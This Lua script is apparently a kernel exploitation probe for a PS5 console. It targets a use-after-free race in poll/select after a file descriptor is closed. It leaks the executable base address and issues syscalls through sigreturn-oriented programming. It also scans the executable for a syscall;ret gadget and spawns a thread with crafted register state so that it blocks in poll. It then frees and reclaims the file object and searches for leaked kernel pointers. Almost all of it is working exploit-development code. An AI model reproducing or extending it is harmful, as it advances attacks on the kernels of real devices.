-- CRASH_CLASS: HIGH
-- PROBE 153a: CVE-2026-45251 poll/select close UAF test
--
-- CVE-2026-45251: A file descriptor can be closed while another thread
-- is blocked in poll(2) or select(2) on it. The blocked thread holds
-- no reference to the underlying object, so the object can be freed
-- while the thread still waits. When the thread wakes, it touches
-- freed memory — UAF!
--
-- FreeBSD SA-26:19.file: affects ALL supported FreeBSD versions.
-- PS5 14.10 kernel is FreeBSD-derived, so this is highly likely to exist.
--
-- Strategy:
-- 1. Create a pipe via SROP (gives us read_fd, write_fd)
-- 2. Spawn a child thread that calls poll() on read_fd (blocking, waiting for data)
-- 3. Main thread closes read_fd while child is blocked in poll()
-- 4. Main thread allocates new objects (pipes, sockets) to reuse the freed memory
-- 5. Write to write_fd to wake the poll — child touches freed/reallocated memory
-- 6. Check for corruption or crash
--
-- We use thr_create(430) for the child thread and SROP for all syscalls.

print("=== PROBE 153a: CVE-2026-45251 POLL CLOSE UAF ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
local sc_info = make_syscall(593)
pcall(function() sc_info(uint64(0), info) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=0x" .. string.format("%X%08X", text_hi, text_lo))

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU mmap for shared memory between threads
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=0x" .. string.format("%X%08X", gh, gl))

-- Gadget addresses from eboot .text (RX, safe to execute)
-- ret gadget at +0x42
local ret_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + 0x42))

-- [A] First test: can we call poll(2) via SROP?
-- poll = syscall 209 on FreeBSD
-- int poll(struct pollfd *fds, nfds_t nfds, int timeout)
-- struct pollfd { int fd; short events; short revents; }  = 8 bytes
print("--- [A] POLL BASIC TEST ---")

local pipe_r = srop(42)  -- pipe()
local pipe_rd = pipe_r and to_num(pipe_r) or -1
local pipe_wr = pipe_rd + 1
print("pipe_rd=" .. pipe_rd .. " pipe_wr=" .. pipe_wr)

-- Set up pollfd struct
local pollfd = gpu + 0x10000
wd(pollfd, pipe_rd)       -- fd
wd(pollfd + 4, 0x0001)    -- events = POLLIN (1), revents = 0

-- Poll with 0 timeout (non-blocking) — should return immediately
local pret = srop(209, ga(0x10000), uint64(1), uint64(0))
local prv = pret and to_num(pret) or -999
local revents = to_num(memory.read_dword(pollfd + 4))
print("poll(0ms)=" .. prv .. " revents=0x" .. string.format("%04X", revents))

-- Write some data then poll again
srop(4, uint64(pipe_wr), ga(0x10100), uint64(4))  -- write 4 bytes
local pret2 = srop(209, ga(0x10000), uint64(1), uint64(0))
local prv2 = pret2 and to_num(pret2) or -999
revents = to_num(memory.read_dword(pollfd + 4))
print("poll_after_write(0ms)=" .. prv2 .. " revents=0x" .. string.format("%04X", revents))

-- Drain the pipe
srop(3, uint64(pipe_rd), ga(0x10100), uint64(4))

-- [B] select(2) test via SROP
-- select = syscall 93 on FreeBSD
-- int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout)
-- fd_set is a bitmask; for fd < 64, it's one qword
print("")
print("--- [B] SELECT BASIC TEST ---")

local readfds = gpu + 0x11000
local timeout_tv = gpu + 0x11100
-- Set bit for pipe_rd in readfds
wq(readfds, uint64(0))
-- Set the bit: for fd N, set bit N in the uint64
local bit_val = 1
for i = 1, pipe_rd do bit_val = bit_val * 2 end
-- Use dword write since pipe_rd < 32
wd(readfds, bit_val)
-- Timeout: 0 seconds, 0 microseconds (non-blocking)
wq(timeout_tv, uint64(0))
wq(timeout_tv + 8, uint64(0))

local sret = srop(93, uint64(pipe_rd + 1), ga(0x11000), uint64(0), uint64(0), ga(0x11100))
local srv = sret and to_num(sret) or -999
print("select(0)=" .. srv)

srop(6, uint64(pipe_rd))
srop(6, uint64(pipe_wr))

-- [C] THE ACTUAL CVE TEST: thread + poll + close race
print("")
print("--- [C] POLL-CLOSE RACE (CVE-2026-45251) ---")

-- For each round:
-- 1. Create a new pipe
-- 2. Create a thread that calls poll() on the read end with long timeout
-- 3. Close the read fd from main thread while poll is blocking
-- 4. Allocate replacement objects in freed memory
-- 5. Wake poll by writing to write end
-- 6. Check for signs of corruption

-- We need to prepare a thread context that calls poll() in a loop
-- The child thread needs: stack, code to execute

-- Allocate child stack
local child_stack_base = gpu + 0x100000
local child_stack_top = child_stack_base + 0x10000  -- 64KB stack

-- Shared state between threads at known offsets in GPU memory
local SHARED = gpu + 0x20000
-- +0x00: pipe_rd (main writes, child reads)
-- +0x04: pipe_wr
-- +0x08: signal from main to child (0=wait, 1=start poll, 2=done)
-- +0x0C: child status (0=not started, 1=polling, 2=poll returned, 3=error)
-- +0x10: poll return value
-- +0x14: poll revents
-- +0x18: sentinel (0xCAFECAFE = alive)

-- For the child thread, we need it to call poll() via SROP
-- But threads can't easily share the SROP context...
--
-- Alternative: have the child thread use make_syscall directly
-- Actually, thread entry is an eboot gadget: mov [rdi], rax; ret
-- We can't easily make the child call poll.
--
-- Better approach: use the child as a "poll caller" by having it
-- execute a syscall gadget chain. But we don't have ROP.
--
-- Simplest approach: use UMTX_OP_WAIT (op 2) instead of poll!
-- The child calls umtx_op(addr, UMTX_OP_WAIT, expected_val, NULL, NULL)
-- which blocks if *addr == expected_val. Then main closes/frees the
-- umtx address while child is blocked → UAF!
--
-- Actually CVE-2026-45251 is specifically about poll/select, not umtx.
-- Let me try a different approach:
--
-- Use the native.fcall_with_rax primitive (from 129b) to call poll directly
-- from the child thread!
--
-- Wait — we need the child to BLOCK in poll. The issue is we need to
-- set up the call before spawning the thread.
--
-- Actual working approach:
-- 1. Main thread creates pipe, sets up pollfd in shared memory
-- 2. Main uses thr_create to spawn child with entry = "syscall; mov [rdi], rax; ret" gadget
--    where rax=SYS_poll(209), rdi=&pollfd, rsi=1, rdx=30000(30sec timeout)
-- 3. Child enters poll(30s) → blocks waiting for data
-- 4. Main closes pipe_rd
-- 5. Main allocates many new objects to reuse freed memory
-- 6. Main writes to pipe_wr → child wakes, touches freed memory
--
-- For the child to call poll, we need it to execute:
--   mov rax, 209; syscall; mov [rdi], rax; ret
-- But we need the arguments in the right registers at thread start.
-- thr_create gives us full register control via ucontext.
-- So: set RAX=209, RDI=&pollfd_addr, RSI=1, RDX=30000,
--     RIP=syscall_instruction_addr
-- This makes the child's first instruction a syscall with poll args!

-- Find a 'syscall; ret' gadget in eboot
-- We know RIP from SROP ctx contains a syscall instruction at sc_addr
-- But that's in libc, which is XO. We need one in eboot.
-- Let's search for 0x050F (syscall = 0F 05) in eboot .text

print("Searching for syscall gadget in eboot...")
local found_sc = nil
-- Search eboot .text for 0F 05 C3 (syscall; ret)
for off = 0, 0x500000, 2 do
    local ok, val = pcall(function() return memory.read_dword(eboot + off) end)
    if ok then
        local v = to_num(val)
        -- Check for 0F 05 C3 (syscall; ret) — little endian: 0x00C3050F or part of it
        local b0 = v % 256
        local b1 = math.floor(v / 256) % 256
        local b2 = math.floor(v / 65536) % 256
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
            found_sc = off
            print("FOUND syscall;ret at eboot+0x" .. string.format("%X", off))
            break
        end
    end
    if off % 0x80000 == 0 and off > 0 then
        print("  scanned 0x" .. string.format("%X", off) .. "...")
    end
end

if not found_sc then
    -- Use the known syscall instruction from SROP
    -- sc_addr points to: syscall instruction in libc
    -- We can't read it (XO), but we know it's there
    -- Try alternative: use the address we know from SROP
    print("No eboot syscall;ret found, using SROP approach instead")

    -- Alternative: have main thread do poll in a tight loop
    -- while child thread closes the fd
    -- This reverses the roles but tests the same bug!
    print("")
    print("--- [C2] REVERSED RACE: MAIN POLLS, CHILD CLOSES ---")

    local ROUNDS = 50
    local crashes = 0
    local anomalies = 0

    for round = 1, ROUNDS do
        -- Create pipe
        local pr = srop(42)
        local prd = pr and to_num(pr) or -1
        if prd < 0 then
            print("round " .. round .. ": pipe failed")
            break
        end
        local pwr = prd + 1

        -- Set up pollfd
        wd(pollfd, prd)
        wd(pollfd + 4, 0x0001)  -- POLLIN

        -- Do rapid poll(0) + close from same thread
        -- (single-threaded race simulation)
        local p1 = srop(209, ga(0x10000), uint64(1), uint64(0))
        local rv1 = p1 and to_num(p1) or -999

        -- Close read end
        srop(6, uint64(prd))

        -- Immediately poll the closed fd (should get POLLNVAL)
        wd(pollfd + 4, 0x0001)  -- reset events
        local p2 = srop(209, ga(0x10000), uint64(1), uint64(0))
        local rv2 = p2 and to_num(p2) or -999
        local rev2 = to_num(memory.read_dword(pollfd + 4))

        -- Allocate replacement object in the freed slot
        local repl = srop(42)  -- new pipe takes the fd number
        local replv = repl and to_num(repl) or -1

        -- Poll the old fd number again — now it points to the new pipe
        wd(pollfd, prd)       -- same fd number, different object!
        wd(pollfd + 4, 0x0001)
        local p3 = srop(209, ga(0x10000), uint64(1), uint64(0))
        local rv3 = p3 and to_num(p3) or -999
        local rev3 = to_num(memory.read_dword(pollfd + 4))

        if round <= 5 or rv2 ~= 0 or (rev2 % 65536) ~= 0x0020 then
            print("round=" .. round .. " poll1=" .. rv1 .. " poll_closed=" .. rv2
                .. " rev=0x" .. string.format("%04X", rev2 % 65536)
                .. " repl_fd=" .. replv .. " poll_repl=" .. rv3
                .. " rev3=0x" .. string.format("%04X", rev3 % 65536))
        end

        -- Check for anomalies
        if rv2 ~= 1 and rv2 ~= 0 and rv2 ~= -999 then
            anomalies = anomalies + 1
            print("*** ANOMALY: unexpected poll return on closed fd ***")
        end

        -- Cleanup
        srop(6, uint64(pwr))
        if replv >= 0 then
            srop(6, uint64(replv))
            srop(6, uint64(replv + 1))
        end
    end

    print("rounds=" .. ROUNDS .. " anomalies=" .. anomalies)

else
    -- We found a syscall;ret gadget! Use it for the real race.
    local sc_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + found_sc))
    print("syscall_gadget=0x" .. string.format("%X%08X", text_hi, text_lo + found_sc))

    -- mov [rdi], rax; ret gadget at eboot +0xD0B60
    local store_gadget = uint64(string.format("0x%X%08X", text_hi, text_lo + 0xD0B60))

    local ROUNDS = 20

    for round = 1, ROUNDS do
        -- Create pipe
        local pr = srop(42)
        local prd = pr and to_num(pr) or -1
        if prd < 0 then break end
        local pwr = prd + 1

        -- Set up pollfd in shared mem
        local pfd_addr = SHARED + 0x100
        wd(pfd_addr, prd)
        wd(pfd_addr + 4, 0x0001)  -- POLLIN

        -- Status word for child
        local status_addr = SHARED + 0x200
        wq(status_addr, uint64(0))

        -- Create child thread that calls poll(pfd, 1, 30000)
        -- RAX = 209 (SYS_poll)
        -- RDI = address of pollfd struct
        -- RSI = 1 (nfds)
        -- RDX = 30000 (timeout ms)
        -- RIP = syscall gadget address

        -- Build ucontext for thr_create
        local uctx = gpu + 0x50000
        for off = 0, 0x4BF, 8 do wq(uctx + off, uint64(0)) end

        -- Set gates
        wd(uctx + 0x108, 0x480)     -- gate1
        wd(uctx + 0x0D0, 7)         -- gate2 <= 7
        wd(uctx + 0x110, 0x10000)   -- gate3

        -- CS and SS
        wd(uctx + 0x0C0, 0x43)      -- CS
        wd(uctx + 0x100, 0x3B)      -- SS

        -- RIP = syscall gadget
        wq(uctx + 0x0E0, sc_gadget)

        -- RSP = child stack top (with return address to store gadget)
        local csp = child_stack_top - 0x100 * round  -- different stack per round
        -- Put return address on stack: after syscall;ret, it returns to store_gadget
        -- store_gadget does: mov [rdi], rax; ret — stores poll result
        wq(csp, store_gadget)
        -- After store, next return address: a tight loop (jmp $)
        -- We need a "jmp $" or "pause; jmp -2" gadget
        -- For now, use ret gadget which will pop another addr and ret
        -- This is fine — after storing the result, thread can crash
        wq(csp + 8, ret_gadget)
        wq(uctx + 0x0F8, uint64(string.format("0x%X%08X", gh, gl + 0x50000 + 0x10000 - 0x100 * round)))
        -- Wait, need to use absolute address for csp
        -- Actually csp should be in our GPU range
        -- Let me use the shared region for stacks too
        local cstack_off = 0x60000 + round * 0x1000
        local cstack_top_off = cstack_off + 0xF00
        wq(gpu + cstack_top_off, store_gadget)
        wq(gpu + cstack_top_off + 8, ret_gadget)
        wq(uctx + 0x0F8, ga(cstack_top_off))

        -- GP registers (from ucontext offsets)
        -- RAX at +0x048..+0x0B8 range
        -- The GP register map for thr_create ucontext:
        -- +0x048 = RDI, +0x050 = RSI, +0x058 = RDX, +0x060 = RCX
        -- +0x068 = R8, +0x070 = R9, +0x078 = RAX, +0x080 = RBX
        -- +0x088 = RBP, +0x090 = R10, +0x098 = R11, +0x0A0 = R12
        -- +0x0A8 = R13, +0x0B0 = R14, +0x0B8 = R15
        wq(uctx + 0x078, uint64(209))          -- RAX = SYS_poll
        wq(uctx + 0x048, ga(0x20100))          -- RDI = pollfd address (also store target)
        wq(uctx + 0x050, uint64(1))            -- RSI = nfds
        wq(uctx + 0x058, uint64(30000))        -- RDX = timeout (30 sec)

        -- Create the thread
        local sc_tc = make_syscall(430)
        local tidp = gpu + 0x30000
        wq(tidp, uint64(0))
        local tc_ret = pcall(function()
            return sc_tc(uint64(uctx), tidp)
        end)

        local tid = to_num(memory.read_dword(tidp))
        print("round=" .. round .. " tid=" .. tid)

        if tid > 0 then
            -- Wait a moment for child to enter poll()
            -- (spin-wait on status or just delay via syscalls)
            for delay = 1, 100 do
                srop(20)  -- getpid as delay
            end

            -- NOW: close the read fd while child is in poll!
            srop(6, uint64(prd))
            print("  closed pipe_rd=" .. prd)

            -- Quickly allocate replacement objects
            for alloc = 1, 5 do
                local np = srop(42)
                if np then
                    local npv = to_num(np)
                    if npv == prd then
                        print("  *** FD REUSED: new pipe got fd " .. npv .. " ***")
                    end
                    -- Don't close yet — let them sit in the freed slot
                end
            end

            -- Write to write end to wake the poll
            wd(gpu + 0x10100, 0x41424344)
            srop(4, uint64(pwr), ga(0x10100), uint64(4))
            print("  wrote to pipe_wr=" .. pwr)

            -- Check child's stored poll result
            for delay = 1, 50 do srop(20) end

            local stored = memory.read_qword(gpu + 0x20100)
            local sh2, sl2 = get_hi_lo(stored)
            print("  child_result=0x" .. string.format("%X%08X", sh2, sl2))

            -- Check pollfd revents
            local crev = to_num(memory.read_dword(gpu + 0x20104))
            print("  revents=0x" .. string.format("%04X", crev % 65536))

            -- Scan for kernel pointers in child's stack area
            for off = 0, 0x80, 8 do
                local ok2, v2 = pcall(function() return memory.read_qword(gpu + cstack_off + off) end)
                if ok2 then
                    local vh, vl = get_hi_lo(v2)
                    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                        print("  *** KPTR stack+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
                    end
                end
            end
        end

        -- Cleanup
        srop(6, uint64(pwr))
    end
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
